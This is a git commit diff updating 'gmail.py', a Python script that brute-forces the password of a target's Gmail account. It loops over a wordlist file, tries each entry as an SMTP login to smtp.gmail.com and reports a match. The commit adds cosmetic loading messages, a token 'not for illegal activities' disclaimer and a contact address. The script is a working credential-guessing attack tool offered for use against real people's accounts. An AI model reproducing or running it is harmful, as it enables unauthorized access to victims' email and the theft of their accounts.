6de6897a7b3ae3da1ec0d96e86e491db6e480591
root@Nooby <70494625+Hash-Nooby@users.noreply.github.com>
2020-09-22 18:03:22 -0400

    Update

--- gmail.py
+++ gmail.py
@@ -1,12 +1,20 @@
-
+import time
 import smtplib
+import os
 
+print('[~] Please wait while the program is loading...')
+print('[~] Checking files integrity...')
+print('[~] This tool is not for illegal activities...')
+time.sleep(3)
+print('')
+print('[!!] For any questions or help please contact: HighS3c@protonmail.ch')
+print('')
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-user = raw_input("Enter the target's email address: ")
-passwfile = raw_input("Enter the password file name: ")
+user = raw_input("[1] Enter the target's email address: ")
+passwfile = raw_input("[2] Enter the password file name: ")
 passwfile = open(passwfile, "r")
 
 for password in passwfile:
@@ -14,6 +22,8 @@ for password in passwfile:
 		smtpserver.login(user, password)
 
 		print "[+] Password Found %s" % password
-		break;
+		break
+
 	except smtplib.SMTPAuthenticationError:
+		print('')
 		print "[!] Password Incorrect: %s" % password
